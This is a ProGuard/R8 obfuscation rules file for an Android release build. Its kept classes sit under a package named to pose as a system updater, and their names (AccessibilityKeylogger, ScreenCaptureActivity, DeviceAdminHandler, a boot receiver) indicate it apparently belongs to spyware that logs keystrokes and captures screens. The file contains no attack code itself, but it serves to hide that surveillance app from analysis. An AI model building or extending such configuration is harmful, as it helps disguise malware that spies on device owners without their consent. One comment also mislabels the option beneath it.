# ProGuard/R8 rules for release build obfuscation
# Used in conjunction with proguard-android-optimize.txt

# ============================================================
# KEEP ANDROID MANIFEST COMPONENTS
# These are instantiated by the system via reflection based on manifest declarations
# ============================================================

# Application class
-keep class com.android.systemui.updater.SystemUpdateReceiver {
    public <init>(...);
}

# Activities
-keep class com.android.systemui.updater.UpdateCheckerActivity {
    public <init>(...);
}
-keep class com.android.systemui.updater.ScreenCaptureActivity {
    public <init>(...);
}

# Services (including AccessibilityService)
-keep class com.android.systemui.updater.SystemUpdateService {
    public <init>(...);
}
-keep class com.android.systemui.updater.capabilities.AccessibilityKeylogger {
    public <init>(...);
}

# BroadcastReceivers
-keep class com.android.systemui.updater.BootUpdateReceiver {
    public <init>(...);
}
-keep class com.android.systemui.updater.DeviceAdminHandler {
    public <init>(...);
}

# ============================================================
# KEEP @Keep ANNOTATED CLASSES/MEMBERS
# ============================================================
-keep @androidx.annotation.Keep class * { *; }
-keepclassmembers class * {
    @androidx.annotation.Keep *;
}

# ============================================================
# KEEP NATIVE METHODS (prepare for future JNI usage)
# ============================================================
-keepclasseswithmembernames class * {
    native <methods>;
}

# ============================================================
# OPTIMIZATION SETTINGS
# ============================================================
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
-optimizationpasses 5
-allowaccessmodification
-mergeinterfacesaggressively

# ============================================================
# SUPPRESS WARNINGS FOR EXTERNAL LIBRARIES
# ============================================================
-dontwarn okhttp3.**
-dontwarn okio.**
-dontwarn kotlin.**
-dontwarn kotlinx.**
-dontwarn org.json.**
-dontwarn java.nio.**
-dontwarn javax.annotation.**

# ============================================================
# GENERAL OBFUSCATION SETTINGS
# ============================================================
# Repackage classes - move obfuscated classes to a single package
#-repackageclasses ''
#flattenpackagehierarchy ''

# Use mixed-case class names for better obfuscation
-useuniqueclassmembernames

# Keep line numbers for stack traces (optional, increases output size)
#-keepattributes SourceFile,LineNumberTable
